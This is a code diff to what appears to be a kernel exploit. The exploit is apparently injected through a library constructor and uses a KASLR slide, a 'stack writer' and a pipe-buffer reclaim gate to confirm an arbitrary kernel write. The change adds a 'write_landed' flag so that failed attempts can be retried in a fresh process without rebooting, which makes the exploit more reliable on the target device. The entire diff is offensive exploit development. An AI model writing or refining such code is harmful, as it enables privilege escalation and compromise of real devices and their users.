@@ -24,6 +24,18 @@ struct app_p0_shared_state {
   atomic_int slide_ready;
   atomic_int p0_ready;
   atomic_int writer_started;
+  /*
+   * Evidence that an arbitrary write actually landed, as opposed to merely
+   * being attempted.  app_publish_p0_dirty() is called on the gate path after
+   * verify_p0_pipe_oracle_gate() reports a hit, i.e. a pipe buffer really
+   * moved; app_publish_writer_started() only says a write window opened.
+   * The supervisor must gate its "refusing retry" decision on this, not on
+   * writer_started: on this device slide_trigger_physical_state() returns
+   * ok=1 for every attempt (window opens) while gate_result stays 0 (write
+   * never landed), so writer_started alone burned the single cross-process
+   * retry on clean misses and forced a reboot per attempt.
+   */
+  atomic_int write_landed;
   _Atomic uintptr_t offset;
   _Atomic uintptr_t gate_page_struct;
   _Atomic uintptr_t probe_page_struct;
@@ -49,6 +61,13 @@ void app_publish_p0_dirty(void) {
   atomic_store(&app_p0_state->gate_page_struct, p0_gate_page_struct);
   atomic_store(&app_p0_state->probe_page_struct, p0_probe_page_struct);
   atomic_store(&app_p0_state->dirty, 1);
+  /*
+   * Reaching here means the gate path observed a real reclaim hit (a pipe
+   * buffer moved), so an arbitrary write did land.  This is the signal the
+   * supervisor uses to refuse a cross-process retry, because a landed write
+   * leaves kernel state that a fresh process cannot safely unwind.
+   */
+  atomic_store(&app_p0_state->write_landed, 1);
 }
 
 void app_publish_slide_ready(void) {
@@ -225,8 +244,16 @@ __attribute__((constructor)) static void load(void) {
     }
 
 #if defined(SLIDE_P0_OFFSET_CANDIDATES)
-    if (atomic_load(&app_p0_state->writer_started)) {
-      pr_error("stack writer ran; refusing retry on this boot\n");
+    /*
+     * Only a write that actually landed makes this boot non-retryable.  A
+     * clean miss (no pipe buffer moved, gate_result == 0) leaves the kernel
+     * untouched, so the next attempt can run in a fresh process.  Previously
+     * this checked writer_started, which is set whenever a write window opens
+     * -- always true on this device -- so every clean miss aborted the run
+     * with "stack writer ran; refusing retry on this boot" and cost a reboot.
+     */
+    if (atomic_load(&app_p0_state->write_landed)) {
+      pr_error("stack writer landed a write; refusing retry on this boot\n");
       break;
     }
 #endif
